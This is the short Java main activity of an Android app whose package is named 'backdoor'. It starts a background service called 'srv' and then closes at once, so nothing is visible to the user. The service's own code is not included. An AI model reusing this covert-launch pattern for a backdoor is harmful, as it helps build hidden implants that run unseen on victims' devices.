package com.voila.backdoor;

import android.app.*;
import android.content.*;
import android.os.*;
import android.widget.*;
import android.view.View.*;
import android.view.*;
import android.util.*;

public class MainActivity extends Activity
{
    @Override
    public void onCreate(Bundle savedInstanceState)
	{
        super.onCreate(savedInstanceState);
		Log.i("fuck","MainActivity");
		Intent i=new Intent(getApplicationContext(),srv.class);
		getApplicationContext().startService(i);
		finish();
    }
}
